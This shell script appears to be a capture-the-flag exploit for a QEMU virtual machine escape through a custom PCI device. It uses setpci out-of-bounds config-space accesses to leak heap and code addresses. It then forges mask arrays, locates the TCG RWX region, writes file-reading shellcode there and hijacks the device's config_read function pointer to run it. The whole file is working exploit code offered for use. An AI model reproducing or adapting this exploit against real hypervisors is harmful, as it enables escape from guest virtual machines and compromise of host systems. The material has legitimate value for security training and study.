# Leak qemu pci device object heap addr by reading nitedev->obj1.parent (Right behind nitedev->mem).
setpci -s 00:04.0 0xe0.l=0xfffffffe
lower_heapaddr=$(setpci -s 00:04.0 0xe4.l)

setpci -s 00:04.0 0xe0.l=0xffffffff
upper_heapaddr=$(setpci -s 00:04.0 0xe4.l)

# Leak nite_config_read function ptr by reading nitedev->parent_obj.config_read
setpci -s 00:04.0 0xe0.l=0xfffffe86
lower_ptr=$(setpci -s 00:04.0 0xe4.l)

setpci -s 00:04.0 0xe0.l=0xfffffe87
upper_ptr=$(setpci -s 00:04.0 0xe4.l)

# Write fake wmask array so we can write shellcode later
setpci -s 00:04.0 0xe0.l=0x0
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0x1
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0x2
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0x3
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0x4
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0x5
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0x6
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0x7
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0x8
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0x9
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0xa
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0xb
setpci -s 00:04.0 0xe4.l=0xffffffff
setpci -s 00:04.0 0xe0.l=0xc
setpci -s 00:04.0 0xe4.l=0xffffffff

# Write fake w1c array
setpci -s 00:04.0 0xe0.l=0x10
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x11
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x12
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x13
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x14
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x15
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x16
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x17
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x18
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x19
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x1a
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x1b
setpci -s 00:04.0 0xe4.l=0x0
setpci -s 00:04.0 0xe0.l=0x1c
setpci -s 00:04.0 0xe4.l=0x0

#Calculate wmask address from nitedev addr heap leak
mem_addr=$((($((16#$upper_heapaddr))<<32) + $((16#$lower_heapaddr)) + 2792))

#Calculate w1cmask address from heap leak
mem2_addr=$(( ($((16#$upper_heapaddr))<<32) + $((16#$lower_heapaddr)) + 2792 + 16*4))

mem_lower_addr=$(printf "%x" $((mem_addr & 0xffffffff)))
mem_upper_addr=$(printf "%x" $(((mem_addr >> 32) & 0xffffffff)))

mem2_lower_addr=$(printf "%x" $((mem2_addr & 0xffffffff)))
mem2_upper_addr=$(printf "%x" $(((mem2_addr >> 32) & 0xffffffff)))

# Calculate tcg_qemu_tb_exec addr using exe leak

full_ptr=$(( ($((16#$upper_ptr))<<32) + $((16#$lower_ptr)) ))
tcg_exec_zone=$(( $full_ptr - $((16#3c60b0)) + $((16#18036a0))))

tcg_exec_lower=$(printf "%x" $((tcg_exec_zone & 0xffffffff)))
tcg_exec_upper=$(printf "%x" $(((tcg_exec_zone >> 32) & 0xffffffff)))

# Overwrite w1mask to point to fake wmask
setpci -s 00:04.0 0xe0.l=0xfffffd74
setpci -s 00:04.0 0xe4.l=$mem_lower_addr

setpci -s 00:04.0 0xe0.l=0xfffffd75
setpci -s 00:04.0 0xe4.l=$mem_upper_addr

# Overwrite w1cmask to point to fake w1cmask
setpci -s 00:04.0 0xe0.l=0xfffffd76
setpci -s 00:04.0 0xe4.l=$mem2_lower_addr

setpci -s 00:04.0 0xe0.l=0xfffffd77
setpci -s 00:04.0 0xe4.l=$mem2_upper_addr

# Overwrite nitedev->parent_obj.config field to point to tcg_qemu_tb_exec. This changes the configuration space completely from guest's PoV.

setpci -s 00:04.0 0xe0.l=0xfffffd70
setpci -s 00:04.0 0xe4.l=$tcg_exec_lower

setpci -s 00:04.0 0xe0.l=0xfffffd71
setpci -s 00:04.0 0xe4.l=$tcg_exec_upper

# Leak RWX zone by reading contents of the new config which now points to tcg_qemu_tb_exec

lower_rwx=$(setpci -s 00:04.0 0x00.l)
upper_rwx=$(setpci -s 00:04.0 0x04.l)

# We are going to write shellcode far away from the prologue to avoid clobbering other tcg stuff.

target_rwx_addr=$(( ($((16#$upper_rwx))<<32) + $((16#$lower_rwx)) + 1024*1024))

target_rwx_low=$(printf "%x" $((target_rwx_addr & 0xffffffff)))
target_rwx_high=$(printf "%x" $(((target_rwx_addr >> 32) & 0xffffffff)))

# Again overwrite nitedev->parent_obj.config field to point to the calculated rwx address

setpci -s 00:04.0 0xe0.l=0xfffffd70
setpci -s 00:04.0 0xe4.l=$target_rwx_low

setpci -s 00:04.0 0xe0.l=0xfffffd71
setpci -s 00:04.0 0xe4.l=$target_rwx_high

# Write our shellcode to target RWX region (does open and sendfile syscalls)

setpci -s 00:04.0 0x00.l=0x2b0c031

setpci -s 00:04.0 0x04.l=0x1f3d8d48

setpci -s 00:04.0 0x08.l=0x48000000

setpci -s 00:04.0 0x0c.l=0x3148f631

setpci -s 00:04.0 0x10.l=0x89050fd2

setpci -s 00:04.0 0x14.l=0x28b8c6

setpci -s 00:04.0 0x18.l=0x1bf0000

setpci -s 00:04.0 0x1c.l=0x31000000

setpci -s 00:04.0 0x20.l=0xc2c749d2

setpci -s 00:04.0 0x24.l=0x20

setpci -s 00:04.0 0x28.l=0x662f050f

setpci -s 00:04.0 0x2c.l=0x67616c

# Overwrite nitedev->parent_obj.config_read ptr to point to target rwx region
setpci -s 00:04.0 0xe0.l=0xfffffe86
setpci -s 00:04.0 0xe4.l=$target_rwx_low

setpci -s 00:04.0 0xe0.l=0xfffffe87
setpci -s 00:04.0 0xe4.l=$target_rwx_high

# Trigger the overwritten config_read ptr now
setpci -s 00:04.0 0xe4.l
